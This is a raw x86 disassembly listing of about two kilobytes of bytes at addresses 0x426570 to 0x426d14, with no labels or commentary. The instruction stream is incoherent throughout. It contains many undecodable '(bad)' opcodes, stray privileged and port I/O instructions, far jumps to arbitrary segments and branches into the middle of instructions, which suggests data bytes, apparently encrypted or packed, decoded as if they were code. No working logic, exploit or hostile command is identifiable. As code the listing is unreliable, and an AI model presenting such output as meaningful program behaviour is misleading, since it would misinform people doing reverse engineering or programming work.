  426570:	loope  0x426523
  426572:	in     al,dx
  426573:	mov    edi,0x21bade54
  426578:	mov    ds,WORD PTR [eax-0x4a]
  42657b:	lahf   
  42657c:	scas   eax,DWORD PTR es:[edi]
  42657d:	dec    edx
  42657e:	stos   BYTE PTR es:[edi],al
  42657f:	aaa    
  426580:	inc    ecx
  426581:	ss popa 
  426583:	adc    DWORD PTR [edx],ebp
  426585:	fisttp QWORD PTR [ecx-0x7b]
  426588:	inc    edx
  426589:	popa   
  42658a:	push   ebp
  42658b:	faddp  st(1),st
  42658d:	inc    edi
  42658e:	add    eax,0x4431cd4e
  426593:	jo     0x426537
  426595:	pop    edi
  426596:	inc    edi
  426597:	arpl   sp,bx
  426599:	mov    dl,0x3
  42659b:	push   cs
  42659c:	sti    
  42659d:	mov    eax,0x782bc26a
  4265a2:	push   cs
  4265a3:	and    DWORD PTR [esi-0x480e32fd],esi
  4265a9:	cmp    al,0x43
  4265ab:	pop    ebp
  4265ac:	(bad)  
  4265ad:	jp     0x4265bf
  4265af:	repnz push ebp
  4265b1:	fcmovu st,st(1)
  4265b3:	inc    ebx
  4265b4:	mov    esp,0xb69122a2
  4265b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265ba:	sub    eax,0xf87cba9f
  4265bf:	pop    ecx
  4265c0:	inc    ecx
  4265c1:	loope  0x426619
  4265c3:	je     0x42658d
  4265c5:	clc    
  4265c6:	nop
  4265c7:	fs push edx
  4265c9:	ret    
  4265ca:	inc    eax
  4265cb:	imul   eax,DWORD PTR [eax-0x1a8d91b2],0x1d1dbd5b
  4265d5:	pop    ebx
  4265d6:	sub    bh,dl
  4265d8:	test   al,0x43
  4265da:	(bad)  
  4265db:	mov    dl,0xb
  4265dd:	push   ebx
  4265de:	or     ah,BYTE PTR [eax-0x439beb2f]
  4265e4:	push   ecx
  4265e5:	fcomip st,st(4)
  4265e7:	mov    al,ds:0xa8ad2a35
  4265ec:	aaa    
  4265ed:	inc    ebp
  4265ee:	fdiv   DWORD PTR [ecx+0x49359806]
  4265f4:	data16 sub al,0x6
  4265f7:	popf   
  4265f8:	mov    bl,0xf4
  4265fa:	std    
  4265fb:	js     0x426587
  4265fd:	(bad)  
  4265ff:	adc    ecx,DWORD PTR [eax+0x734587b9]
  426605:	sbb    ch,BYTE PTR [edx-0x77]
  426608:	push   edi
  426609:	(bad)  
  42660a:	int3   
  42660b:	sbb    dh,BYTE PTR [ebp-0x78aab800]
  426611:	inc    ebx
  426612:	mov    ch,0x7
  426614:	inc    DWORD PTR [edi]
  426616:	cmp    ch,BYTE PTR [ebp+eax*2-0x37]
  42661a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42661b:	mov    edx,0x2c18105e
  426620:	push   eax
  426621:	and    al,0x8d
  426623:	pop    esp
  426624:	cld    
  426625:	mov    ebp,0xa5ffd9f5
  42662a:	std    
  42662b:	dec    ebp
  42662c:	xchg   ecx,eax
  42662d:	aad    0x1
  42662f:	mov    edi,0x720b7bad
  426634:	sbb    dh,dl
  426636:	sahf   
  426637:	pop    ebp
  426638:	inc    ecx
  426639:	pop    edx
  42663a:	repnz test DWORD PTR [esi+0x3],ebp
  42663e:	lods   eax,DWORD PTR ds:[esi]
  42663f:	dec    eax
  426640:	leave  
  426641:	xchg   esp,eax
  426642:	out    0xf8,eax
  426644:	neg    BYTE PTR [ebx+ecx*4+0x7f]
  426648:	jl     0x42663c
  42664a:	mov    esp,DWORD PTR [ecx]
  42664c:	add    DWORD PTR [ebx+0x7],eax
  42664f:	popa   
  426650:	xchg   esi,eax
  426651:	dec    esi
  426652:	imul   ebp,ecx,0x3b
  426655:	xchg   ebp,eax
  426656:	rcl    BYTE PTR [edx+0x53],1
  426659:	push   ss
  42665a:	enter  0x59c,0xdf
  42665e:	jge    0x4266d2
  426660:	sbb    ecx,DWORD PTR [eax-0x74]
  426663:	bound  eax,QWORD PTR [ebx+0x3a]
  426666:	xchg   edx,eax
  426667:	aad    0x93
  426669:	xchg   esp,eax
  42666a:	hlt    
  42666b:	jle    0x42660b
  42666d:	and    ch,al
  42666f:	xor    BYTE PTR [ecx+0x5b],ch
  426672:	mov    cl,0x5f
  426674:	repnz cli 
  426676:	jmp    0x9095:0xc50469cd
  42667d:	bound  eax,QWORD PTR [edi]
  42667f:	and    eax,0xdc1a7cb0
  426684:	xchg   ebp,ebp
  426686:	rcr    BYTE PTR ss:[eax+0x1],0xee
  42668b:	push   ebp
  42668c:	mov    al,BYTE PTR [ebx-0x45090181]
  426692:	pop    ds
  426693:	fnstcw WORD PTR [esi]
  426695:	push   edi
  426696:	fsub   st(1),st
  426698:	xchg   esi,eax
  426699:	pop    esi
  42669a:	je     0x4266b1
  42669c:	(bad)  
  42669d:	mov    dh,BYTE PTR [edi+0x2c]
  4266a0:	fisubr DWORD PTR [edx]
  4266a2:	sbb    al,BYTE PTR [ebp+0x5a4933b6]
  4266a8:	icebp  
  4266a9:	mov    edi,0x55e7ef4e
  4266ae:	outs   dx,DWORD PTR ds:[esi]
  4266af:	arpl   WORD PTR [ebx-0xe],dx
  4266b2:	hlt    
  4266b3:	sbb    eax,0xfb99ae48
  4266b8:	cmp    BYTE PTR [esi],ch
  4266ba:	pop    edi
  4266bb:	jae    0x4266ad
  4266bd:	test   al,0xa5
  4266bf:	and    edx,0xed3a2b9b
  4266c5:	adc    bh,BYTE PTR [ebp-0x2d]
  4266c8:	div    BYTE PTR [ecx]
  4266ca:	arpl   WORD PTR [ebx+0x1e],bp
  4266cd:	and    al,0x5a
  4266cf:	scas   al,BYTE PTR es:[edi]
  4266d0:	gs jecxz 0x42665a
  4266d3:	mov    cl,0x61
  4266d5:	xchg   esp,eax
  4266d6:	push   es
  4266d7:	or     al,0x4f
  4266d9:	not    BYTE PTR [ecx]
  4266db:	mov    cs,WORD PTR [esi-0x67]
  4266de:	and    BYTE PTR [ebx-0x38],bl
  4266e1:	pushf  
  4266e2:	fdivr  st(3),st
  4266e4:	(bad)  
  4266e5:	xor    BYTE PTR [ebx+0x6c],0x29
  4266e9:	jbe    0x4266b6
  4266eb:	lahf   
  4266ec:	shr    DWORD PTR [edi],cl
  4266ee:	lods   eax,DWORD PTR ds:[esi]
  4266ef:	dec    edi
  4266f0:	adc    al,0xc5
  4266f2:	repz dec edi
  4266f4:	stc    
  4266f5:	dec    ecx
  4266f6:	and    eax,0xbca6a0f0
  4266fb:	jge    0x42676e
  4266fd:	dec    eax
  4266fe:	cld    
  4266ff:	test   ebx,ebx
  426701:	inc    eax
  426702:	xchg   esi,eax
  426703:	repz pop esi
  426705:	in     al,dx
  426706:	inc    edx
  426707:	scas   eax,DWORD PTR es:[edi]
  426708:	rcr    BYTE PTR [esi],1
  42670a:	dec    esp
  42670b:	repz icebp 
  42670d:	jecxz  0x426778
  42670f:	adc    al,0x27
  426711:	inc    eax
  426712:	bound  esi,QWORD PTR [ecx+0x14b43854]
  426718:	dec    ecx
  426719:	in     al,0x4e
  42671b:	icebp  
  42671c:	(bad)  
  42671d:	mov    ah,0x30
  42671f:	js     0x426778
  426721:	hlt    
  426722:	xor    BYTE PTR [eax],ch
  426724:	popf   
  426725:	mov    cl,0xd1
  426727:	cdq    
  426728:	sbb    eax,0x7eddc914
  42672d:	cld    
  42672e:	daa    
  42672f:	test   ebp,esi
  426731:	lods   eax,DWORD PTR cs:[esi]
  426733:	ss sub esi,ecx
  426736:	mov    ds:0x53400d,al
  42673b:	xor    BYTE PTR ds:0x9603f51c,al
  426741:	jo     0x4266f0
  426743:	clc    
  426744:	inc    edi
  426745:	pushf  
  426746:	pop    esi
  426747:	xor    eax,0x8addd638
  42674c:	push   esp
  42674d:	jae    0x4266e7
  42674f:	adc    al,0xc3
  426751:	xchg   edx,eax
  426752:	xchg   ebx,eax
  426753:	and    esp,DWORD PTR [ecx+ecx*4+0x440e17b8]
  42675a:	mov    ds:0xe1551a59,eax
  42675f:	or     al,0xfd
  426761:	out    dx,al
  426762:	fsub   QWORD PTR [eax-0x26]
  426765:	test   al,0x9
  426767:	mov    ah,BYTE PTR [eax]
  426769:	repz retf 
  42676b:	aad    0x76
  42676d:	daa    
  42676e:	sbb    BYTE PTR [esi-0x188b835c],bl
  426774:	arpl   WORD PTR [eax+ebx*4+0x364fbb35],ax
  42677b:	cdq    
  42677c:	rcl    DWORD PTR [ebx-0x1],cl
  42677f:	ins    DWORD PTR es:[edi],dx
  426780:	xchg   esp,eax
  426781:	xor    eax,0x44628e74
  426786:	mov    esi,0x847243d7
  42678b:	ficom  WORD PTR [edi+0x4090ff4b]
  426791:	mov    ebx,0x62e0cec
  426796:	in     al,dx
  426797:	iret   
  426798:	xor    esi,edi
  42679a:	ss xor eax,0x589eb698
  4267a0:	aam    0xc4
  4267a2:	xor    BYTE PTR [edi],cl
  4267a4:	inc    edx
  4267a5:	push   0x73
  4267a7:	xor    eax,0x54c6192a
  4267ac:	sti    
  4267ad:	dec    edi
  4267ae:	clc    
  4267af:	pop    es
  4267b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267b1:	adc    edx,DWORD PTR [edi+0x5c058372]
  4267b7:	icebp  
  4267b8:	nop
  4267b9:	arpl   WORD PTR [edx+0x2f],bx
  4267bc:	iret   
  4267bd:	dec    eax
  4267be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267bf:	loope  0x4267a9
  4267c1:	loop   0x4267c4
  4267c3:	or     dl,BYTE PTR [ecx+0x7196edc0]
  4267c9:	push   edi
  4267ca:	lock lahf 
  4267cc:	loopne 0x4267e8
  4267ce:	sbb    al,0x31
  4267d0:	cmp    al,0x91
  4267d2:	aam    0xe7
  4267d4:	adc    eax,0x87c61f
  4267d9:	lahf   
  4267da:	sbb    eax,0x64f2f0cd
  4267df:	lods   eax,DWORD PTR ds:[esi]
  4267e0:	pop    es
  4267e1:	pop    edi
  4267e2:	pop    eax
  4267e3:	shr    esp,0xa
  4267e6:	dec    ebp
  4267e7:	adc    dl,cl
  4267e9:	xor    al,0xca
  4267eb:	lds    edi,FWORD PTR [edi+0x5579fba1]
  4267f1:	cmp    DWORD PTR [eax],eax
  4267f3:	shl    bh,cl
  4267f5:	mov    ebx,0xc0e70ec2
  4267fa:	pop    ds
  4267fb:	adc    al,0xd6
  4267fd:	adc    al,0xaf
  4267ff:	and    BYTE PTR [edx],al
  426801:	fild   WORD PTR [edx]
  426803:	mov    eax,ds:0x2d78517f
  426808:	aaa    
  426809:	pop    edx
  42680a:	dec    ebx
  42680b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42680c:	enter  0x5312,0x2e
  426810:	test   eax,0xc022a27e
  426815:	sub    ecx,ebx
  426817:	sbb    eax,0xb580ed9e
  42681c:	and    BYTE PTR [ebx-0x6b17d0a7],dl
  426822:	in     al,dx
  426823:	mov    edx,ebx
  426825:	pop    esi
  426826:	inc    ebx
  426827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426828:	push   ecx
  426829:	mov    ch,0xf3
  42682b:	das    
  42682c:	pushf  
  42682d:	jle    0x426893
  42682f:	repnz jmp 0xc4ba:0xf906adae
  426837:	pop    ebp
  426838:	jbe    0x426886
  42683a:	inc    esp
  42683b:	jae    0x4267c2
  42683d:	aam    0xb3
  42683f:	outs   dx,DWORD PTR ds:[esi]
  426840:	and    al,0xea
  426842:	pop    ecx
  426843:	sub    DWORD PTR [eax],ebp
  426845:	jg     0x42686a
  426847:	inc    ebp
  426848:	mov    es,WORD PTR [ebx]
  42684a:	push   edi
  42684b:	mov    ebp,0x45d83001
  426850:	and    al,0xc3
  426852:	mov    DWORD PTR [esi+0x19e08af6],eax
  426858:	xchg   BYTE PTR [esi+0x7c],cl
  42685b:	dec    ebx
  42685c:	retf   
  42685d:	cmp    al,0x39
  42685f:	xor    ecx,edx
  426861:	ret    
  426862:	xchg   ebp,eax
  426863:	push   ss
  426864:	imul   ebx,ebx,0x45
  426867:	cmc    
  426868:	pop    es
  426869:	cli    
  42686a:	call   0xbb04ac6b
  42686f:	sub    BYTE PTR [edi-0x4e],0x4
  426873:	out    0x6b,eax
  426875:	(bad)  
  426876:	dec    edx
  426877:	adc    BYTE PTR [eax],dh
  426879:	call   0xa7b6:0x814cfdab
  426880:	push   eax
  426881:	sub    DWORD PTR [esi-0x274657e],esp
  426887:	jle    0x4268f6
  426889:	call   0xa8c7383
  42688e:	cld    
  42688f:	popf   
  426890:	bound  ecx,QWORD PTR [ecx+0x2e3036df]
  426896:	div    dh
  426898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426899:	mov    ah,0x2d
  42689b:	ins    BYTE PTR es:[edi],dx
  42689c:	pop    ss
  42689d:	xor    cl,dh
  42689f:	retf   0x6e03
  4268a2:	cdq    
  4268a3:	cmp    DWORD PTR [ebp+ebp*8-0x20],0xabbbb13b
  4268ab:	out    dx,eax
  4268ac:	sub    eax,0x3042c60f
  4268b1:	or     DWORD PTR [edi],eax
  4268b3:	aaa    
  4268b4:	cmc    
  4268b5:	push   ecx
  4268b6:	leave  
  4268b7:	adc    ecx,DWORD PTR [edi+0x52]
  4268ba:	mov    eax,ds:0x3745a97d
  4268bf:	jmp    0xc19c:0x54902274
  4268c6:	and    DWORD PTR [ecx],0x44bd17a4
  4268cc:	push   ebx
  4268cd:	in     eax,dx
  4268ce:	jae    0x42694f
  4268d0:	popa   
  4268d1:	xchg   edx,eax
  4268d2:	sub    ch,dh
  4268d4:	and    dh,BYTE PTR [ebp-0x52e0a4f3]
  4268da:	push   edx
  4268db:	sbb    eax,0x649f6f61
  4268e0:	imul   ecx,DWORD PTR ds:0x664b3484,0xc057bb90
  4268ea:	inc    esp
  4268eb:	mov    ecx,0xb463733c
  4268f0:	cdq    
  4268f1:	push   edi
  4268f2:	fbld   TBYTE PTR [eax-0x2f]
  4268f5:	jns    0x426963
  4268f7:	icebp  
  4268f8:	aad    0x7a
  4268fa:	loop   0x42696e
  4268fc:	into   
  4268fd:	in     al,dx
  4268fe:	sbb    esi,DWORD PTR [ebx]
  426900:	mov    ah,0x33
  426902:	lahf   
  426903:	hlt    
  426904:	je     0x42695b
  426906:	push   es
  426907:	pop    ebp
  426908:	sub    eax,0xcf3c3991
  42690d:	mov    edx,DWORD PTR [esi]
  42690f:	cmp    DWORD PTR [ebp-0x3a],esp
  426912:	jo     0x42694f
  426914:	cdq    
  426915:	cmp    ah,0x4a
  426918:	pop    ecx
  426919:	jns    0x426999
  42691b:	lock lods eax,DWORD PTR ds:[esi]
  42691d:	lods   al,BYTE PTR ds:[esi]
  42691e:	dec    edx
  42691f:	xchg   edx,eax
  426920:	fld    QWORD PTR [ecx+0x42248f52]
  426926:	adc    bl,BYTE PTR [ebx]
  426928:	fst    QWORD PTR [esp+edi*2-0x4be312e2]
  42692f:	shl    ebp,1
  426931:	cmp    eax,0xef3883d9
  426936:	sbb    bl,BYTE PTR [edi+0x12f1d749]
  42693c:	mov    ebp,0x59d17e46
  426941:	and    al,0x8d
  426943:	xor    BYTE PTR [eax+0x4e],dl
  426946:	xor    esp,DWORD PTR [edx]
  426948:	ins    BYTE PTR es:[edi],dx
  426949:	inc    esi
  42694a:	xor    ecx,DWORD PTR [esi]
  42694c:	shl    ebp,cl
  42694e:	jae    0x4269c1
  426950:	inc    ebx
  426951:	cmc    
  426952:	ins    BYTE PTR es:[edi],dx
  426953:	mov    ch,0x28
  426955:	sbb    BYTE PTR [edx+eax*2+0x4b],dl
  426959:	xor    esp,DWORD PTR [ebp+0x69]
  42695c:	xor    edi,DWORD PTR [eax]
  42695e:	pop    edx
  42695f:	jg     0x4268f0
  426961:	xchg   esi,eax
  426962:	ror    edx,cl
  426964:	jnp    0x4269e3
  426966:	push   ss
  426967:	fwait
  426968:	out    0x4c,eax
  42696a:	pop    esp
  42696b:	mov    edx,0x8d7fc53d
  426970:	shl    ebp,0x4e
  426973:	add    eax,DWORD PTR [ecx+ecx*1-0x2cdf3d46]
  42697a:	es push eax
  42697c:	fwait
  42697d:	or     BYTE PTR [ecx-0x4e],bh
  426980:	cmp    eax,0x5ab9fe94
  426985:	push   ds
  426986:	pop    eax
  426987:	xchg   esi,eax
  426988:	lods   eax,DWORD PTR ds:[esi]
  426989:	loop   0x4269f8
  42698b:	inc    esp
  42698c:	jg     0x4269e1
  42698e:	out    dx,al
  42698f:	pandn  mm7,QWORD PTR ds:0xb242bba3
  426996:	pop    esp
  426997:	ds std 
  426999:	mov    BYTE PTR [edx+ebp*4-0x51],ah
  42699d:	add    al,0x7b
  42699f:	jbe    0x42694f
  4269a1:	adc    cl,dh
  4269a3:	rcl    bh,0xe9
  4269a6:	or     BYTE PTR [edi+eiz*2+0x3b],0x9a
  4269ab:	mov    esi,0xb7223717
  4269b0:	push   ebp
  4269b1:	imul   ebx,edi,0xffffffe6
  4269b4:	mov    DWORD PTR [eax-0x72063192],esp
  4269ba:	xchg   ebx,eax
  4269bb:	cmp    bl,ch
  4269bd:	sub    al,BYTE PTR [ebx-0x5e]
  4269c0:	lahf   
  4269c1:	popa   
  4269c2:	cmc    
  4269c3:	ror    DWORD PTR [eax],1
  4269c5:	push   edx
  4269c6:	popf   
  4269c7:	fisub  DWORD PTR [esi+ebp*2-0x5adb2fa0]
  4269ce:	ror    BYTE PTR [esi+0x2ac022c0],1
  4269d4:	inc    esi
  4269d5:	shl    BYTE PTR [eax+0x2],1
  4269d8:	scas   al,BYTE PTR es:[edi]
  4269d9:	mov    edi,0x10d40661
  4269de:	and    DWORD PTR [esi],eax
  4269e0:	cmp    eax,eax
  4269e2:	mov    esi,DWORD PTR [edx+ebx*2-0x42834912]
  4269e9:	gs pop ebx
  4269eb:	lds    edi,FWORD PTR [ebx-0x73]
  4269ee:	dec    edi
  4269ef:	bound  eax,QWORD PTR [ebx+eax*1-0x46]
  4269f3:	xchg   esi,eax
  4269f4:	scas   al,BYTE PTR es:[edi]
  4269f5:	mov    edx,0x3d7a9f2d
  4269fa:	ins    DWORD PTR es:[edi],dx
  4269fb:	mov    ecx,DWORD PTR [edi]
  4269fd:	out    0x28,al
  4269ff:	cmp    dl,bh
  426a01:	or     al,0xdb
  426a03:	mov    dl,0x12
  426a05:	loopne 0x426a54
  426a07:	stc    
  426a08:	inc    ebp
  426a09:	int    0x0
  426a0b:	ficomp DWORD PTR [ecx]
  426a0d:	cmp    al,0xe6
  426a0f:	sub    DWORD PTR [ebx+0x6ac00cf0],ecx
  426a15:	mov    esi,0x27c52e3
  426a1a:	fst    DWORD PTR [ebx+eax*4-0x7ae65fa6]
  426a21:	fstp   TBYTE PTR [edx+eax*1-0x6]
  426a25:	cdq    
  426a26:	ds xchg edi,eax
  426a28:	jecxz  0x426a8e
  426a2a:	inc    ebx
  426a2b:	imul   edx,DWORD PTR [esi+eax*4],0x79
  426a2f:	jge    0x426a5e
  426a31:	or     esp,esi
  426a33:	(bad)  
  426a34:	push   ds
  426a35:	out    dx,al
  426a36:	and    eax,0xeac56c43
  426a3b:	cmc    
  426a3c:	jmp    0x4629:0x3625de8f
  426a43:	sub    eax,0x59405f6c
  426a48:	arpl   WORD PTR [ecx+0x207b6a2d],si
  426a4e:	cmp    eax,0xf928cebc
  426a53:	xor    al,0x4d
  426a55:	fsub   QWORD PTR [ecx]
  426a57:	sbb    DWORD PTR [edi-0x77],edx
  426a5a:	inc    esp
  426a5b:	mov    ch,0x19
  426a5d:	xor    eax,DWORD PTR [edi+0x65c05e61]
  426a63:	or     DWORD PTR [ebx-0x477de2f1],eax
  426a69:	ins    DWORD PTR es:[edi],dx
  426a6a:	imul   esi,DWORD PTR [esi+0x70356f2],0x2d
  426a71:	imul   esi,ecx,0x2b
  426a74:	sub    esi,esp
  426a76:	adc    dh,BYTE PTR [eiz*1-0x4751e42f]
  426a7d:	or     al,0x2f
  426a7f:	jno    0x426a77
  426a81:	pop    esi
  426a82:	xchg   DWORD PTR [edi-0x38ddd765],edx
  426a88:	jae    0x426a91
  426a8a:	add    al,0x15
  426a8c:	mov    ebx,0xc012374c
  426a91:	in     eax,dx
  426a92:	stos   DWORD PTR es:[edi],eax
  426a93:	push   ebp
  426a94:	test   eax,esi
  426a96:	push   esi
  426a97:	xor    eax,0xe0b0e01
  426a9c:	mov    dh,0x3b
  426a9e:	mov    edx,DWORD PTR [eax]
  426aa0:	dec    ebp
  426aa1:	scas   eax,DWORD PTR es:[edi]
  426aa2:	sbb    DWORD PTR ds:0x401d5b45,ebx
  426aa8:	int    0xb4
  426aaa:	adc    eax,0x6ec69268
  426aaf:	push   ss
  426ab0:	cli    
  426ab1:	cmp    BYTE PTR [esi+0x7974e18c],ch
  426ab7:	sbb    eax,0x6863eaf7
  426abc:	mov    ?,WORD PTR [edx]
  426abe:	xlat   BYTE PTR ds:[ebx]
  426abf:	jge    0x426a53
  426ac1:	shr    BYTE PTR [edx-0x64db4fea],0xe0
  426ac8:	clc    
  426ac9:	xor    DWORD PTR [edi],eax
  426acb:	ror    BYTE PTR [eax+0x20392b7b],cl
  426ad1:	adc    eax,0x421153d9
  426ad6:	shr    DWORD PTR [esi+0x48],0x52
  426ada:	sub    DWORD PTR [eax],0x5621462a
  426ae0:	test   DWORD PTR [ecx-0x12],0x69ade332
  426ae7:	aas    
  426ae8:	jecxz  0x426b01
  426aea:	dec    edi
  426aeb:	push   ss
  426aec:	cld    
  426aed:	and    al,bl
  426aef:	sub    esi,esi
  426af1:	mov    dh,0x97
  426af3:	inc    ebx
  426af4:	cli    
  426af5:	mov    BYTE PTR [edi],dl
  426af7:	imul   eax,DWORD PTR ds:[eax-0x714bbd81],0xffffffab
  426aff:	push   0x9abefe41
  426b04:	mov    ds:0x370701d5,al
  426b09:	jb     0x426aa1
  426b0b:	pop    esi
  426b0c:	in     eax,dx
  426b0d:	dec    esi
  426b0e:	jne    0x426b54
  426b10:	add    eax,0x347895c0
  426b15:	jge    0x426aa1
  426b17:	aad    0x45
  426b19:	jg     0x426b77
  426b1b:	and    edx,DWORD PTR [edx-0x68]
  426b1e:	fs pop ds
  426b20:	fld    TBYTE PTR [ecx-0x16d06494]
  426b26:	push   ebp
  426b27:	js     0x426b0c
  426b29:	sti    
  426b2a:	ins    BYTE PTR es:[edi],dx
  426b2b:	mov    ch,0x46
  426b2d:	add    DWORD PTR [ebx-0x5b41ca50],ebp
  426b33:	les    esi,FWORD PTR [esi-0x16]
  426b36:	or     al,0x86
  426b38:	hlt    
  426b39:	jb     0x426b56
  426b3b:	sub    al,0xef
  426b3d:	gs test bl,cl
  426b40:	mov    bl,0xf
  426b42:	ja     0x426b47
  426b44:	push   ds
  426b45:	xor    al,BYTE PTR [esi]
  426b47:	sbb    ebx,DWORD PTR [eax+0x8ad31f0]
  426b4d:	out    0xd8,al
  426b4f:	je     0x426bbf
  426b51:	inc    dl
  426b53:	popf   
  426b54:	loop   0x426aea
  426b56:	xor    edi,DWORD PTR [ebp+edi*8+0x55]
  426b5a:	push   es
  426b5b:	loope  0x426b9c
  426b5d:	rcl    DWORD PTR [edx+0x69],0x3
  426b61:	push   ebx
  426b62:	div    BYTE PTR [esi-0x24]
  426b65:	mov    esi,0xf250b2d6
  426b6a:	add    BYTE PTR [esi-0x1],0x8f
  426b6e:	inc    eax
  426b6f:	jmp    0x62d8ed9e
  426b74:	jle    0x426be4
  426b76:	mov    ds:0x6fc7792a,al
  426b7b:	sub    DWORD PTR [edx+0x572b8a13],0x9ba3b9
  426b85:	inc    edi
  426b86:	(bad)
  426b89:	add    BYTE PTR [edi+0x56],al
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0x3b81,0xb7
  426b98:	xchg   BYTE PTR [edi+0x42],cl
  426b9b:	stc    
  426b9c:	add    DWORD PTR [eax],eax
  426b9e:	jge    0x426ba6
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	xchg   edx,eax
  426ba3:	mov    ch,0x44
  426ba5:	xchg   ebx,eax
  426ba6:	mov    WORD PTR [esi+0x40],?
  426ba9:	in     al,dx
  426baa:	inc    ebp
  426bab:	imul   esp,DWORD PTR es:[edi-0x76],0xc7ffcfa9
  426bb3:	ret    0xdc15
  426bb6:	cdq    
  426bb7:	ret    
  426bb8:	fldenv [ebx+ebp*1]
  426bbb:	js     0x426b75
  426bbd:	mov    dh,0x7e
  426bbf:	je     0x426bb5
  426bc1:	jb     0x426b9b
  426bc3:	in     eax,0x3c
  426bc5:	or     DWORD PTR [ebx],esi
  426bc7:	test   BYTE PTR [edi],0xda
  426bca:	jno    0x426b66
  426bcc:	cmp    BYTE PTR [eax],cl
  426bce:	push   cs
  426bcf:	loope  0x426ba3
  426bd1:	mov    ds:0xdf551ff0,al
  426bd6:	add    al,0x8a
  426bd8:	jmp    0x48d3432e
  426bdd:	mov    eax,ds:0xa0386bb
  426be2:	fdiv   DWORD PTR [esi]
  426be4:	ins    BYTE PTR es:[edi],dx
  426be5:	mov    ah,0xeb
  426be7:	jecxz  0x426c00
  426be9:	loope  0x426c29
  426beb:	mov    dh,0x2
  426bed:	sbb    al,0x93
  426bef:	mov    bh,0x47
  426bf1:	xchg   ebp,eax
  426bf2:	jmp    0x48263a2c
  426bf7:	inc    ebx
  426bf8:	stos   BYTE PTR es:[edi],al
  426bf9:	mov    BYTE PTR [esi+0x77],ch
  426bfc:	pop    ss
  426bfd:	mov    esp,0x8cd13c5a
  426c02:	les    esp,FWORD PTR [ebx-0x80]
  426c05:	xchg   esp,eax
  426c06:	jnp    0x426c56
  426c08:	(bad)
  426c0b:	stos   DWORD PTR es:[edi],eax
  426c0c:	sub    BYTE PTR [esi],dh
  426c0e:	je     0x426c7d
  426c10:	jecxz  0x426bf8
  426c12:	inc    esp
  426c13:	add    eax,0x850627c4
  426c18:	popa   
  426c19:	mov    esi,0xf08ef12
  426c1e:	lods   al,BYTE PTR ds:[esi]
  426c1f:	xor    al,0x1b
  426c21:	popf   
  426c22:	test   BYTE PTR ds:0x66aa00f1,cl
  426c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c29:	loopne 0x426c62
  426c2b:	in     al,0x1d
  426c2d:	(bad)  
  426c2e:	pop    esp
  426c2f:	lds    esi,FWORD PTR [ecx-0x29]
  426c32:	mov    dl,0x2a
  426c34:	stos   BYTE PTR es:[edi],al
  426c35:	pop    esi
  426c36:	jno    0x426c90
  426c38:	adc    BYTE PTR [ecx],ah
  426c3a:	xchg   DWORD PTR [ecx],ecx
  426c3c:	in     eax,dx
  426c3d:	mov    BYTE PTR [eax-0x49],dh
  426c40:	adc    ecx,esi
  426c42:	call   0xd8eaab87
  426c47:	ja     0x426cac
  426c49:	pushf  
  426c4a:	test   DWORD PTR [edx+0x40126c84],ecx
  426c50:	push   ebx
  426c51:	xchg   ecx,eax
  426c52:	or     DWORD PTR [ebx],ebx
  426c54:	inc    esi
  426c55:	mov    fs,WORD PTR [ebx-0x237cf19a]
  426c5b:	test   eax,0x74f47f44
  426c60:	xchg   ecx,eax
  426c61:	jg     0x426c7a
  426c63:	pusha  
  426c64:	stc    
  426c65:	adc    DWORD PTR [eax+0x1e64ccbd],ebp
  426c6b:	ss dec edx
  426c6d:	data16 sub al,0xa7
  426c70:	xor    al,0x9
  426c72:	(bad)  
  426c73:	jns    0x426ced
  426c75:	add    ecx,DWORD PTR [esi]
  426c77:	cli    
  426c78:	adc    BYTE PTR [ecx+0x13],al
  426c7b:	jno    0x426c4f
  426c7d:	or     dl,BYTE PTR [ecx+0x6]
  426c80:	jmp    0xfef7:0x7c8f2486
  426c87:	ret    
  426c88:	lds    edi,FWORD PTR [ecx+esi*1]
  426c8b:	inc    edx
  426c8c:	rcr    DWORD PTR [ebx],1
  426c8e:	hlt    
  426c8f:	jle    0x426ca8
  426c91:	add    BYTE PTR ds:0xf674b633,cl
  426c97:	shl    BYTE PTR [edx-0x8],1
  426c9a:	cmp    eax,0x208ffc0f
  426c9f:	adc    al,0x91
  426ca1:	stc    
  426ca2:	jns    0x426cdf
  426ca4:	add    BYTE PTR [eax-0x60af12fb],ch
  426caa:	je     0x426ce6
  426cac:	xchg   ebp,eax
  426cad:	in     eax,dx
  426cae:	push   esi
  426caf:	mov    ebx,0x2f08eb4f
  426cb4:	fidiv  DWORD PTR [edx-0x6dfc4100]
  426cba:	cmc    
  426cbb:	not    bl
  426cbd:	xor    esi,DWORD PTR [edx]
  426cbf:	cmc    
  426cc0:	je     0x426c8a
  426cc2:	(bad)  
  426cc3:	aad    0xe1
  426cc5:	(bad)  
  426cc7:	or     ebx,0x36
  426cca:	mov    DWORD PTR [esi],ebx
  426ccc:	inc    edi
  426ccd:	(bad)  
  426cce:	es in  al,dx
  426cd0:	ret    0xc8eb
  426cd3:	sbb    eax,0x80a685c3
  426cd8:	and    DWORD PTR [esp+eiz*2-0x4eb57c03],ebp
  426cdf:	call   0xf7e951bb
  426ce4:	inc    ebx
  426ce5:	retf   0xe6d1
  426ce8:	pushf  
  426ce9:	loope  0x426cba
  426ceb:	hlt    
  426cec:	enter  0x96a1,0xeb
  426cf0:	cmp    eax,DWORD PTR [eiz*1-0x77ff450d]
  426cf7:	add    edx,edx
  426cf9:	mov    edx,ebx
  426cfb:	dec    ebx
  426cfc:	(bad)  
  426cfd:	push   edx
  426cfe:	call   FWORD PTR [ebp+0x1edc53c]
  426d04:	das    
  426d05:	and    BYTE PTR [ebx+0x7d],bl
  426d08:	retf   0xf68d
  426d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d0c:	lea    ebx,ds:0xbc0ad895
  426d12:	jl     0x426d5b
  426d14:	outs   dx,BYTE PTR ds:[esi]
